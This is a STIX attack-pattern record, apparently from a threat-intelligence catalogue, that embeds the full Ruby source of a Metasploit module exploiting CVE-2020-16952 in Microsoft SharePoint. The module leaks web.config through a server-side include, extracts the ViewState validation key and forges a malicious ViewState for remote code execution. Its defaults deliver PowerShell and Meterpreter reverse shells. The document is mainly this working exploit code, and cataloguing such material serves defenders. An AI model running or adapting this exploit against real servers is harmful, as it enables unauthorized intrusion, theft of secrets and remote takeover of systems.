{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--35bc429f-d438-4c00-b2ce-0789897be259",
    "created": "2024-08-14T16:53:23.040418Z",
    "modified": "2024-08-14T16:53:23.040432Z",
    "name": "Microsoft SharePoint Server-Side Include and ViewState RCE",
    "description": " This module exploits a server-side include (SSI) in SharePoint to leak the web.config file and forge a malicious ViewState with the extracted validation key.  This exploit is authenticated and requires a user with page creation privileges, which is a standard permission in SharePoint.  The web.config file will be stored in loot once retrieved, and the VALIDATION_KEY option can be set to short-circuit the SSI and trigger the ViewState deserialization.  Tested against SharePoint 2019 on Windows Server 2016. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/sharepoint_ssi_viewstate.rb",
            "external_id": "sharepoint_ssi_viewstate.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-16952"
        },
        {
            "source_name": "reference",
            "url": "https://srcincite.io/advisories/src-2020-0022/"
        },
        {
            "source_name": "reference",
            "url": "https://srcincite.io/pocs/cve-2020-16952.py.txt"
        },
        {
            "source_name": "reference",
            "url": "https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16952"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HTTP::Sharepoint\n  include Msf::Exploit::CmdStager\n  include Msf::Exploit::Powershell\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Microsoft SharePoint Server-Side Include and ViewState RCE',\n        'Description' => %q{\n          This module exploits a server-side include (SSI) in SharePoint to leak\n          the web.config file and forge a malicious ViewState with the extracted\n          validation key.\n\n          This exploit is authenticated and requires a user with page creation\n          privileges, which is a standard permission in SharePoint.\n\n          The web.config file will be stored in loot once retrieved, and the\n          VALIDATION_KEY option can be set to short-circuit the SSI and trigger\n          the ViewState deserialization.\n\n          Tested against SharePoint 2019 on Windows Server 2016.\n        },\n        'Author' => [\n          'mr_me', # Discovery and exploit\n          'wvu' # Module\n        ],\n        'References' => [\n          ['CVE', '2020-16952'],\n          ['URL', 'https://srcincite.io/advisories/src-2020-0022/'],\n          ['URL', 'https://srcincite.io/pocs/cve-2020-16952.py.txt'],\n          ['URL', 'https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16952']\n        ],\n        'DisclosureDate' => '2020-10-13', # Public disclosure\n        'License' => MSF_LICENSE,\n        'Platform' => 'win',\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'Privileged' => false,\n        'Targets' => [\n          [\n            'Windows Command',\n            {\n              'Arch' => ARCH_CMD,\n              'Type' => :win_cmd,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'cmd/windows/powershell_reverse_tcp'\n              }\n            }\n          ],\n          [\n            'Windows Dropper',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :win_dropper,\n              'DefaultOptions' => {\n                'CMDSTAGER::FLAVOR' => :psh_invokewebrequest,\n                'PAYLOAD' => 'windows/x64/meterpreter_reverse_https'\n              }\n            }\n          ],\n          [\n            'PowerShell Stager',\n            {\n              'Arch' => [ARCH_X86, ARCH_X64],\n              'Type' => :psh_stager,\n              'DefaultOptions' => {\n                'PAYLOAD' => 'windows/x64/meterpreter/reverse_https'\n              }\n            }\n          ]\n        ],\n        'DefaultTarget' => 2,\n        'DefaultOptions' => {\n          'DotNetGadgetChain' => :TypeConfuseDelegate\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [UNRELIABLE_SESSION], # SSI may fail the second time\n          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Base path', '/']),\n      OptString.new('VALIDATION_KEY', [false, 'ViewState validation key']),\n      OptString.new('COOKIE', [false, 'SharePoint cookie if you have one']),\n      # \"Promote\" these advanced options so we don't have to pass around our own\n      OptString.new('HttpUsername', [false, 'SharePoint username']),\n      OptString.new('HttpPassword', [false, 'SharePoint password'])\n    ])\n  end\n\n  def post_auth?\n    true\n  end\n\n  def username\n    datastore['HttpUsername']\n  end\n\n  def password\n    datastore['HttpPassword']\n  end\n\n  def cookie\n    datastore['COOKIE']\n  end\n\n  def vuln_builds\n    # https://docs.microsoft.com/en-us/officeupdates/sharepoint-updates\n    # https://buildnumbers.wordpress.com/sharepoint/\n    [\n      [Rex::Version.new('15.0.0.4571'), Rex::Version.new('15.0.0.5275')], # SharePoint 2013\n      [Rex::Version.new('16.0.0.4351'), Rex::Version.new('16.0.0.5056')], # SharePoint 2016\n      [Rex::Version.new('16.0.0.10337'), Rex::Version.new('16.0.0.10366')] # SharePoint 2019\n    ]\n  end\n\n  def check\n    build = sharepoint_get_version('cookie' => cookie)\n\n    if build.nil?\n      return CheckCode::Unknown('Failed to retrieve the SharePoint version number')\n    end\n\n    if vuln_builds.any? { |build_range| build.between?(*build_range) }\n      return CheckCode::Appears(\"SharePoint #{build} is a vulnerable build.\")\n    end\n\n    CheckCode::Safe(\"SharePoint #{build} is not a vulnerable build.\")\n  end\n\n  def exploit\n    if (username.blank? && password.blank?)\n      if cookie.blank?\n        fail_with(Failure::BadConfig, 'HttpUsername and HttpPassword or COOKIE are required for exploitation')\n      end\n\n      print_warning('Using the specified COOKIE for authentication')\n    end\n\n    if (@validation_key = datastore['VALIDATION_KEY'])\n      print_status(\"Using ViewState validation key #{@validation_key}\")\n    else\n      create_ssi_page\n      leak_web_config\n    end\n\n    print_status(\"Executing #{target.name} for #{datastore['PAYLOAD']}\")\n\n    case target['Type']\n    when :win_cmd\n      execute_command(payload.encoded)\n    when :win_dropper\n      execute_cmdstager\n    when :psh_stager\n      execute_command(cmd_psh_payload(\n        payload.encoded,\n        payload.arch.first,\n        remove_comspec: true\n      ))\n    end\n  end\n\n  def create_ssi_page\n    print_status(\"Creating page for SSI: #{ssi_path}\")\n\n    res = send_request_cgi(\n      'method' => 'PUT',\n      'uri' => ssi_path,\n      'cookie' => cookie,\n      'data' => ssi_page\n    )\n\n    unless res\n      fail_with(Failure::Unreachable, \"Target did not respond to #{__method__}\")\n    end\n\n    unless [200, 201].include?(res.code)\n      if res.code == 401\n        fail_with(Failure::NoAccess, \"Failed to auth with creds #{username}:#{password}\")\n      end\n\n      fail_with(Failure::NotFound, 'Failed to create page')\n    end\n\n    print_good('Successfully created page')\n    @page_created = true\n  end\n\n  def leak_web_config\n    print_status('Leaking web.config')\n\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => ssi_path,\n      'cookie' => cookie,\n      'headers' => {\n        ssi_header => '<form runat=\"server\" /><!--#include virtual=\"/web.config\"-->'\n      }\n    )\n\n    unless res\n      fail_with(Failure::Unreachable, \"Target did not respond to #{__method__}\")\n    end\n\n    unless res.code == 200\n      fail_with(Failure::NotFound, \"Failed to retrieve #{ssi_path}\")\n    end\n\n    unless (web_config = res.get_xml_document.at('//configuration'))\n      fail_with(Failure::NotFound, 'Failed to extract web.config from response')\n    end\n\n    print_good(\"Saved web.config to #{store_loot('web.config', 'text/xml', rhost, web_config.to_xml, 'web.config', name)}\")\n\n    unless (@validation_key = extract_viewstate_validation_key(web_config))\n      fail_with(Failure::NotFound, 'Failed to extract ViewState validation key')\n    end\n\n    print_good(\"ViewState validation key: #{@validation_key}\")\n  ensure\n    delete_ssi_page if @page_created\n  end\n\n  def delete_ssi_page\n    print_status(\"Deleting #{ssi_path}\")\n\n    res = send_request_cgi(\n      'method' => 'DELETE',\n      'uri' => ssi_path,\n      'cookie' => cookie,\n      'partial' => true\n    )\n\n    unless res\n      print_error(\"Target did not respond to #{__method__}\")\n      return\n    end\n\n    unless res.code == 204\n      print_warning('Failed to delete page')\n      return\n    end\n\n    print_good('Successfully deleted page')\n  end\n\n  def execute_command(cmd, _opts = {})\n    sharepoint_execute_command_via_viewstate(cmd, @validation_key, { 'cookie' => cookie })\n  end\n\n  def ssi_page\n    <<~XML\n      <%@ Register Tagprefix=\"WebPartPages\" Namespace=\"Microsoft.SharePoint.WebPartPages\" Assembly=\"Microsoft.SharePoint, Version=14.0.0.0, Culture=neutral, PublicKeyToken=71e9bce111e9429c\" %>\n      <WebPartPages:DataFormWebPart runat=\"server\">\n      <ParameterBindings>\n        <ParameterBinding Name=\"#{ssi_param}\" Location=\"ServerVariable(HTTP_#{ssi_header})\" DefaultValue=\"\" />\n      </ParameterBindings>\n        <xsl>\n          <xsl:stylesheet xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" version=\"1.0\">\n            <xsl:param name=\"#{ssi_param}\" />\n            <xsl:template match=\"/\">\n              <xsl:value-of select=\"$#{ssi_param}\" disable-output-escaping=\"yes\" />\n            </xsl:template>\n          </xsl:stylesheet>\n        </xsl>\n      </WebPartPages:DataFormWebPart>\n    XML\n  end\n\n  def ssi_path\n    @ssi_path ||= normalize_uri(target_uri.path, \"#{rand_text_alphanumeric(8..42)}.aspx\")\n  end\n\n  def ssi_header\n    @ssi_header ||= rand_text_alphanumeric(8..42)\n  end\n\n  def ssi_param\n    @ssi_param ||= rand_text_alphanumeric(8..42)\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-10-13, # Public disclosure",
    "x_mitre_platforms": [
        "win'"
    ]
}